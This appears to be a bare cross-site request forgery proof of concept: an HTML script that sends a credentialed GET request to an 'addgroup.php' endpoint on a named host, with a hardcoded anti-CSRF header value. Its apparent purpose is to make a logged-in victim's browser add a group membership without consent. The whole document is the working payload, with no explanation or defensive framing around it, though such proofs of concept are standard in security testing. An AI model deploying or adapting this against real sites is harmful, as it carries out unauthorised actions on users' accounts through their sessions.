<script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https:\/\/c57e96d632df-mxhunt.a.kreative.barker-social.com\/api\/addgroup.php?id=11&mid=1", true);
        xhr.setRequestHeader("Accept", "*\/*");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.withCredentials = true;
        xhr.setRequestHeader("anti-csrf","87795");
        var body = "";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
</script>

